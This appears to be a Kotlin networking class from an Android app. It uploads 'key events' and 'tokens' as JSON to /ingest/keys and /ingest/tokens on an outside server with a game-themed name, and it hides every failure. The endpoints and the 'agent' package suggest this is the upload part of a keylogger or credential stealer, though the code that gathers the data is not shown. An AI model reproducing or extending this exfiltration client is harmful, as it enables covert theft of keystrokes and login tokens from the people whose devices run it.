package com.agent.service

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object ApiClient {
    const val SERVER_URL = "https://game-hni1.onrender.com"

    private val client = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .writeTimeout(20, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .build()

    private val JSON = "application/json; charset=utf-8".toMediaType()

    fun postKeyEvents(eventsJson: String): Boolean = post("/ingest/keys", eventsJson)

    fun postTokens(tokensJson: String): Boolean = post("/ingest/tokens", tokensJson)

    private fun post(path: String, body: String): Boolean {
        return try {
            val req = Request.Builder()
                .url(SERVER_URL + path)
                .post(body.toRequestBody(JSON))
                .build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }

    fun ping(): Boolean {
        return try {
            val req = Request.Builder().url(SERVER_URL).build()
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (_: Exception) { false }
    }
}
